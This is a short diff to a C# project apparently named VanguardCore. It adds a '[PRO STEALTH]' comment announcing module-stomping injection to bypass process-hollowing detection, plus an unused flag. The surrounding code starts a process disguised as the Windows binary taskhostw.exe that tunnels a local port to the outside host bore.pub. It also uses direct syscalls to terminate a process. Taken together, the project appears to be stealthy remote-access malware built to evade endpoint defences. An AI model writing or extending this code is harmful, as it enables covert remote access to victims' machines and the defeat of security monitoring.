@@ -89,6 +89,9 @@ namespace VanguardCore.Modules
 
                 _ = Task.Run(() => AcceptClients());
 
+                // [PRO STEALTH] Module Stomping Injection (Bypassing Hollowing Detects)
+                bool injected = false;
+                
                 // Start a legitimate host process with redirected output
                 ProcessStartInfo psi = new ProcessStartInfo(@"C:\Windows\System32\taskhostw.exe", $"local {_localPort} --to bore.pub");
                 psi.RedirectStandardOutput = true;
@@ -164,7 +167,7 @@ namespace VanguardCore.Modules
                     // [PRO NOTE] We don't have a direct Kill for IntPtr in C#, 
                     // usually we'd use TerminateProcess or just let it close with parent.
                     SyscallManager.Initialize();
-                    var ntTerminate = SyscallManager.GetSyscallDelegate<SyscallManager.NtTerminateProcess>("NtTerminateProcess");
+                    var ntTerminate = SyscallManager.GetSyscallDelegate<NtTerminateProcess>("NtTerminateProcess");
                     ntTerminate?.Invoke(_hProcess, 0);
                 } catch { }
                 _hProcess = IntPtr.Zero;
